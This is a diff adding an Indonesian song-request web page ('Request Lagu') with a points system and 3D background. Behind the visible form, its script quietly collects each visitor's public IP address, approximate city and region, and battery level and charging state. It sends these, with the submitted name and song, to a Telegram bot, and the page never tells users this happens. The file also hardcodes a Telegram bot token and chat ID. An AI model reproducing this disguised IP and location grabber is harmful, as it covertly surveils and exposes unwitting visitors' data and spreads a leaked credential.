@@ -1,0 +1,523 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Lagu</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <style>
+        :root {
+            --primary-gradient: linear-gradient(135deg, #6366F1, #3B82F6);
+            --secondary-gradient: linear-gradient(100deg, #10B981, #34D399);
+        }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-image: url(https://cloudkuimages.guru/uploads/images/682973132f555.jpg);
+            /* Fallback background color jika gambar gagal dimuat */
+            background-color: #111827; /* Warna abu-abu gelap */
+            background-size: cover;
+            background-position: center;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow: hidden; /* Mencegah scrollbar jika canvas sedikit lebih besar */
+        }
+        .card {
+            background-color: rgba(255, 255, 255, 0.06);
+            backdrop-filter: blur(12px);
+            border-radius: 1.5rem;
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.3);
+            padding: 3rem;
+            width: 100%;
+            max-width: 36rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: perspective(1000px) rotateX(10deg);
+            transition: transform 0.5s ease;
+        }
+        .card:hover {
+            transform: perspective(1000px) rotateX(7deg) translateY(-4px);
+        }
+        .form-label {
+            font-size: 0.9rem;
+            font-weight: 600;
+            color: #ffffff;
+            margin-bottom: 1rem;
+            display: block;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        .form-input, .form-textarea {
+            width: 100%;
+            padding: 0.9rem;
+            background-color: rgba(255, 255, 255, 0.9); /* Latar belakang input sedikit transparan */
+            color: #1E293B; /* Warna teks input agar kontras dengan background putih */
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 0.75rem;
+            outline: none;
+            transition: border-color 0.3s ease, box-shadow 0.3s ease, background-color 0.3s ease;
+            font-size: 1.1rem;
+            box-shadow: inset 0 2px 4px rgba(0, 0, 0, 0.05);
+        }
+        .form-input::placeholder, .form-textarea::placeholder {
+            color: #6B7280; /* Warna placeholder abu-abu netral */
+        }
+        .form-input:focus, .form-textarea:focus {
+            border-color: rgba(99, 102, 241, 0.7); /* Warna border Indigo saat fokus */
+            box-shadow: 0 6px 16px rgba(0, 0, 0, 0.2), 0 0 0 3px rgba(99, 102, 241, 0.3);
+            background-color: #ffffff; /* Latar belakang putih solid saat fokus */
+            color: #111827; /* Warna teks lebih gelap saat fokus */
+        }
+        .form-textarea {
+            min-height: 10rem;
+            resize: vertical;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem 2.5rem;
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: white;
+            background-image: var(--primary-gradient);
+            border: none;
+            border-radius: 1rem;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease, background-image 0.3s ease;
+            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.3); /* Shadow Indigo */
+            width: 100%;
+            text-align: center;
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.4);
+        }
+        .btn:hover {
+            transform: translateY(-4px) scale(1.04);
+            box-shadow: 0 12px 28px rgba(99, 102, 241, 0.4); /* Shadow Indigo lebih besar */
+            background-image: linear-gradient(135deg, #7C3AED, #2563EB); /* Gradient Ungu-Biru */
+        }
+        .btn:active {
+            transform: translateY(0) scale(1);
+            box-shadow: 0 4px 8px rgba(99, 102, 241, 0.3); /* Shadow Indigo lebih kecil */
+        }
+        .swal2-popup {
+            background-color: #1E293B; /* Dark blue-gray */
+            color: #F8FAFC; /* Light gray */
+            border-radius: 1.25rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 16px 32px rgba(0, 0, 0, 0.3);
+        }
+        .swal2-title {
+            color: #F8FAFC;
+            font-size: 1.8rem;
+            margin-bottom: 1.25rem;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        .swal2-content {
+            color: #E5E7EB; /* Lighter gray */
+            font-size: 1.2rem;
+            margin-bottom: 1.75rem;
+            line-height: 1.7;
+            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
+        }
+        .swal2-confirm {
+            background-image: var(--secondary-gradient); /* Gradien Hijau */
+            color: white;
+            padding: 0.9rem 2rem;
+            border-radius: 1rem;
+            font-size: 1.2rem;
+            font-weight: 600;
+            border: none;
+            cursor: pointer;
+            transition: background-image 0.3s ease, transform 0.2s ease, box-shadow 0.2s ease;
+            box-shadow: 0 6px 16px rgba(16, 185, 129, 0.3); /* Shadow Hijau */
+        }
+        .swal2-confirm:hover {
+            background-image: linear-gradient(100deg, #059669, #047857); /* Gradien Hijau lebih gelap */
+            transform: translateY(-4px) scale(1.04);
+            box-shadow: 0 10px 24px rgba(16, 185, 129, 0.4); /* Shadow Hijau lebih besar */
+        }
+        .swal2-confirm:active {
+            transform: translateY(0) scale(1);
+            box-shadow: 0 3px 6px rgba(16, 185, 129, 0.3); /* Shadow Hijau lebih kecil */
+        }
+        .form-input.error, .form-textarea.error {
+            border-color: #EF4444; /* Merah lebih terang */
+            box-shadow: 0 0 0 3px rgba(239, 68, 68, 0.3);
+        }
+        .error-message {
+            color: #F87171; /* Merah muda terang untuk kontras lebih baik di background gelap */
+            font-size: 0.9rem;
+            margin-top: 0.75rem;
+            display: none;
+            text-shadow: 1px 1px 1px rgba(0, 0, 0, 0.2);
+        }
+        .error-message.visible {
+            display: block;
+        }
+        #poin-anda {
+            font-size: 1.1rem;
+            font-weight: 600;
+            color: #fff;
+            margin-bottom: 1.5rem;
+            text-align: center;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+        }
+        #canvas-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none; /* Canvas tidak menangkap event mouse */
+            z-index: -1; /* Canvas di belakang konten lain */
+        }
+    </style>
+</head>
+<body class="bg-gray-900">
+    <div id="canvas-container">
+        <canvas id="three-canvas"></canvas>
+    </div>
+
+    <div class="card">
+        <h1 class="text-2xl font-semibold text-center text-white mb-6">Request Lagu</h1>
+        <div id="poin-anda">Poin Anda: <span id="total-poin">30</span> Poin</div>
+        <div class="mb-4">
+            <label for="nameInput" class="form-label">Nama</label>
+            <input type="text" id="nameInput" class="form-input" placeholder="Masukkan nama kamu">
+            <div id="name-error" class="error-message">Nama harus diisi.</div>
+        </div>
+        <div class="mb-6">
+            <label for="message" class="form-label">Judul Lagu Atau Penyanyi</label>
+            <textarea id="message" class="form-textarea" placeholder="Masukkan judul lagu atau penyanyi..."></textarea>
+            <div id="message-error" class="error-message">Judul Lagu Atau Penyanyi harus diisi.</div>
+        </div>
+        <button onclick="sendMessage()" class="btn">Kirim Request</button>
+    </div>
+
+    <script>
+        // Variabel global dan elemen DOM
+        let totalPoin = parseInt(localStorage.getItem('totalPoin')) || 30;
+        const poinPerKlik = 5;
+        const totalPoinElement = document.getElementById("total-poin");
+        const nameInputElement = document.getElementById("nameInput");
+        const messageInputElement = document.getElementById("message");
+        const nameErrorElement = document.getElementById("name-error");
+        const messageErrorElement = document.getElementById("message-error");
+
+        // Inisialisasi poin pada tampilan
+        if (totalPoinElement) {
+            totalPoinElement.textContent = totalPoin;
+        }
+
+        // Fungsi untuk mereset poin
+        function resetPoin() {
+            totalPoin = 30;
+            localStorage.setItem('totalPoin', totalPoin);
+            if (totalPoinElement) {
+                totalPoinElement.textContent = totalPoin;
+            }
+            Swal.fire({
+                icon: "success",
+                title: "Poin direset!",
+                text: "Poin Anda telah direset kembali menjadi 30.",
+                confirmButtonColor: "#10B981"
+            });
+        }
+
+        // Fungsi untuk memeriksa dan mereset poin setiap tengah malam
+        function checkAndResetPoin() {
+            const now = new Date();
+            const hours = now.getHours();
+            const minutes = now.getMinutes();
+            if (hours === 0 && minutes === 0) {
+                resetPoin();
+            }
+        }
+
+        checkAndResetPoin();
+        setInterval(checkAndResetPoin, 60000);
+
+        function padTo2Digits(num) {
+            return num.toString().padStart(2, '0');
+        }
+
+        function formatDateTime(date) {
+            const day = padTo2Digits(date.getDate());
+            const month = padTo2Digits(date.getMonth() + 1);
+            const year = date.getFullYear();
+            const hours = padTo2Digits(date.getHours());
+            const minutes = padTo2Digits(date.getMinutes());
+            const seconds = padTo2Digits(date.getSeconds());
+            return `${hours}:${minutes}:${seconds} ${day}/${month}/${year}`;
+        }
+
+        async function sendMessage() {
+            // Tampilkan SweetAlert loading
+            Swal.fire({
+                title: 'Mengirim Request...',
+                text: 'Mohon tunggu sebentar.',
+                allowOutsideClick: false,
+                didOpen: () => {
+                    Swal.showLoading();
+                }
+            });
+
+            const nameValue = nameInputElement.value.trim();
+            const messageValue = messageInputElement.value.trim();
+            let hasErrors = false;
+
+            nameErrorElement.classList.remove("visible");
+            messageErrorElement.classList.remove("visible");
+            nameInputElement.classList.remove("error");
+            messageInputElement.classList.remove("error");
+
+            if (!nameValue) {
+                nameErrorElement.classList.add("visible");
+                nameInputElement.classList.add("error");
+                hasErrors = true;
+            }
+            if (!messageValue) {
+                messageErrorElement.classList.add("visible");
+                messageInputElement.classList.add("error");
+                hasErrors = true;
+            }
+
+            if (hasErrors) {
+                Swal.close(); // Tutup loading jika ada error validasi awal
+                return;
+            }
+
+
+            if (totalPoin < poinPerKlik) {
+                Swal.close(); // Tutup loading
+                Swal.fire({
+                    icon: "error",
+                    title: "Poin Tidak Cukup!",
+                    text: `Poin Anda tidak cukup. Poin Anda: ${totalPoin}. Dibutuhkan ${poinPerKlik}.`,
+                    confirmButtonColor: "#DC2626"
+                });
+                return;
+            }
+
+            // Pengurangan poin dilakukan setelah semua data (termasuk IP & lokasi) berhasil diambil atau default
+            // Namun, untuk UX yang lebih baik, kita bisa asumsikan akan berhasil dan kurangi poin di awal,
+            // lalu kembalikan jika ada error fatal sebelum mengirim ke Telegram.
+            // Untuk saat ini, kita kurangi di sini.
+            // totalPoin -= poinPerKlik;
+            // localStorage.setItem('totalPoin', totalPoin);
+            // if (totalPoinElement) {
+            //     totalPoinElement.textContent = totalPoin;
+            // }
+
+            let batteryLevel = "Tidak diketahui";
+            let chargingStatus = "Tidak diketahui";
+            if ('getBattery' in navigator) {
+                try {
+                    const batteryData = await navigator.getBattery();
+                    batteryLevel = Math.floor(batteryData.level * 100) + "%";
+                    chargingStatus = batteryData.charging ? "Sedang diisi" : "Tidak diisi";
+                } catch (batteryError) {
+                    console.warn("Gagal mengambil status baterai:", batteryError.message);
+                }
+            } else {
+                console.warn("API Status Baterai tidak didukung.");
+            }
+
+            const currentTime = new Date();
+            const formattedTime = formatDateTime(currentTime);
+
+            let publicIp = "Tidak diketahui";
+            let city = "Tidak diketahui";
+            let region = "Tidak diketahui"; // Wilayah/Provinsi
+
+            try {
+                // Menggunakan ipinfo.io untuk mendapatkan IP dan info lokasi
+                // Penting: ipinfo.io mungkin memerlukan token untuk penggunaan volume tinggi atau fitur tertentu.
+                // Untuk penggunaan dasar, endpoint /json seringkali bekerja tanpa token.
+                const geoResponse = await fetch('https://ipinfo.io/json');
+                if (geoResponse.ok) {
+                    const geoData = await geoResponse.json();
+                    publicIp = geoData.ip || publicIp;
+                    city = geoData.city || city;
+                    region = geoData.region || region; // Ini biasanya provinsi
+                    console.log("Info Geo (via ipinfo.io):", geoData);
+                } else {
+                    console.warn("Gagal mengambil info geo dari ipinfo.io: Status", geoResponse.status);
+                    // Jika ipinfo.io gagal, coba ipify.org hanya untuk IP sebagai fallback
+                    try {
+                        const ipResponseFallback = await fetch('https://api.ipify.org?format=json');
+                        if (ipResponseFallback.ok) {
+                            const ipDataFallback = await ipResponseFallback.json();
+                            publicIp = ipDataFallback.ip || publicIp;
+                        }
+                    } catch (ipFallbackError) {
+                        console.warn("Gagal mengambil IP dari ipify.org sebagai fallback:", ipFallbackError.message);
+                    }
+                }
+            } catch (geoError) {
+                console.error("Error saat mengambil info geo:", geoError.message);
+                 // Jika ipinfo.io gagal total, coba ipify.org hanya untuk IP sebagai fallback
+                try {
+                    const ipResponseFallback = await fetch('https://api.ipify.org?format=json');
+                    if (ipResponseFallback.ok) {
+                        const ipDataFallback = await ipResponseFallback.json();
+                        publicIp = ipDataFallback.ip || publicIp;
+                    }
+                } catch (ipFallbackError) {
+                    console.warn("Gagal mengambil IP dari ipify.org sebagai fallback:", ipFallbackError.message);
+                }
+            }
+
+            // Setelah semua data (termasuk yang mungkin gagal) terkumpul, baru kurangi poin
+            if (totalPoin >= poinPerKlik) {
+                 totalPoin -= poinPerKlik;
+                 localStorage.setItem('totalPoin', totalPoin);
+                 if (totalPoinElement) {
+                     totalPoinElement.textContent = totalPoin;
+                 }
+            } else {
+                // Ini seharusnya sudah ditangani di atas, tapi sebagai pengaman ganda
+                Swal.close();
+                Swal.fire({
+                    icon: "error",
+                    title: "Poin Tidak Cukup!",
+                    text: `Poin Anda tidak cukup untuk mengirim request.`,
+                    confirmButtonColor: "#DC2626"
+                });
+                return;
+            }
+
+
+            const botToken = "7221617975:AAGvO_4y3lHW0_p-2q5XqBVbwRIjyMZ99LU"; // GANTI DENGAN TOKEN BOT ANDA
+            const chatId = "7412906249"; // GANTI DENGAN CHAT ID ANDA
+
+            try {
+                const imageUrl = `https://flowfalcon.dpdns.org/imagecreator/ngl?title=Dari ${encodeURIComponent(nameValue)}&text=${encodeURIComponent(messageValue)}`;
+                const finalMessage = `🎶 REQUEST LAGU BARU 🎶\n\n` +
+                                     `👤 Nama : ${nameValue}\n` +
+                                     `🎵 Judul Lagu Atau Penyanyi : ${messageValue}\n` +
+                                     `🕒 Waktu Request : ${formattedTime}\n` +
+                                     `🌐 IP Address : ${publicIp}\n` +
+                                     `📍 Perkiraan Lokasi : ${city}, ${region}\n\n` + // Info Lokasi ditambahkan
+                                     `⚠️ Detail User Tambahan:\n` +
+                                     `🔋 Baterai : ${batteryLevel}\n` +
+                                     `🔌 Status Pengisian : ${chargingStatus}\n\n` +
+                                     `Terima Kasih! 🚀`;
+
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}&photo=${encodeURIComponent(imageUrl)}&caption=${encodeURIComponent(finalMessage)}&parse_mode=Markdown`);
+                Swal.close(); // Tutup loading setelah fetch selesai
+
+                if (response.ok) {
+                    Swal.fire({
+                        icon: "success",
+                        title: "Berhasil!",
+                        text: "Request lagu berhasil dikirim!",
+                        confirmButtonColor: "#10B981"
+                    });
+                    nameInputElement.value = "";
+                    messageInputElement.value = "";
+                } else {
+                    const errorData = await response.json().catch(() => null);
+                    console.error("Telegram API Error:", response.status, errorData);
+                    Swal.fire({
+                        icon: "error",
+                        title: "Gagal Mengirim!",
+                        text: `Request lagu gagal dikirim. Status: ${response.status}. ${errorData && errorData.description ? errorData.description : 'Tidak ada detail.'}`,
+                        confirmButtonColor: "#DC2626"
+                    });
+                     // Kembalikan poin jika pengiriman ke Telegram gagal
+                    totalPoin += poinPerKlik;
+                    localStorage.setItem('totalPoin', totalPoin);
+                    if (totalPoinElement) {
+                        totalPoinElement.textContent = totalPoin;
+                    }
+                }
+            } catch (error) {
+                Swal.close(); // Tutup loading jika ada error di try-catch utama
+                console.error("Error saat mengirim request:", error);
+                Swal.fire({
+                    icon: "error",
+                    title: "Oops, Gagal!",
+                    text: "Terjadi kesalahan: " + error.message,
+                    confirmButtonColor: "#DC2626"
+                });
+                // Kembalikan poin jika ada error fatal
+                totalPoin += poinPerKlik;
+                localStorage.setItem('totalPoin', totalPoin);
+                if (totalPoinElement) {
+                    totalPoinElement.textContent = totalPoin;
+                }
+            }
+        }
+
+        // Pengaturan Scene Three.js
+        let scene, camera, rendererThree, backgroundPlane;
+
+        if (typeof THREE !== 'undefined') {
+            scene = new THREE.Scene();
+            camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const canvas = document.getElementById('three-canvas');
+
+            if (canvas) {
+                rendererThree = new THREE.WebGLRenderer({ canvas: canvas, alpha: true });
+                rendererThree.setSize(window.innerWidth, window.innerHeight);
+                rendererThree.setClearColor(0x000000, 0);
+
+                const ambientLight = new THREE.AmbientLight(0xffffff, 0.7);
+                scene.add(ambientLight);
+                const directionalLight = new THREE.DirectionalLight(0xffffff, 0.9);
+                directionalLight.position.set(5, 10, 7.5);
+                scene.add(directionalLight);
+
+                const textureLoader = new THREE.TextureLoader();
+                const backgroundTexture = textureLoader.load(
+                    'https://cloudkuimages.guru/uploads/images/682973132f555.jpg',
+                    () => { console.log("Tekstur latar belakang Three.js berhasil dimuat."); },
+                    undefined,
+                    (error) => {
+                        console.error('Gagal memuat tekstur latar belakang Three.js:', error);
+                        if (backgroundPlane) {
+                            backgroundPlane.material = new THREE.MeshBasicMaterial({ color: 0x0a0a23, transparent: true, opacity: 0.5 });
+                        }
+                    }
+                );
+                const backgroundGeometry = new THREE.PlaneGeometry(70, 50);
+                const backgroundMaterial = new THREE.MeshBasicMaterial({ map: backgroundTexture, transparent: true, opacity: 0.6 });
+                backgroundPlane = new THREE.Mesh(backgroundGeometry, backgroundMaterial);
+                backgroundPlane.position.z = -30;
+                scene.add(backgroundPlane);
+                camera.position.z = 12;
+            } else {
+                console.error("Elemen canvas 'three-canvas' tidak ditemukan.");
+            }
+        } else {
+            console.warn("Three.js tidak termuat. Animasi 3D tidak akan berjalan.");
+        }
+
+        function animateThreeScene() {
+            if (!rendererThree || !scene || !camera) return;
+            requestAnimationFrame(animateThreeScene);
+            rendererThree.render(scene, camera);
+        }
+
+        window.addEventListener('resize', () => {
+            if (!camera || !rendererThree) return;
+            const newWidth = window.innerWidth;
+            const newHeight = window.innerHeight;
+            camera.aspect = newWidth / newHeight;
+            camera.updateProjectionMatrix();
+            rendererThree.setSize(newWidth, newHeight);
+        });
+
+        window.onload = function() {
+            if (typeof animateThreeScene === 'function' && rendererThree) {
+                animateThreeScene();
+            }
+            checkAndResetPoin();
+        };
+    </script>
+</body>
+</html>
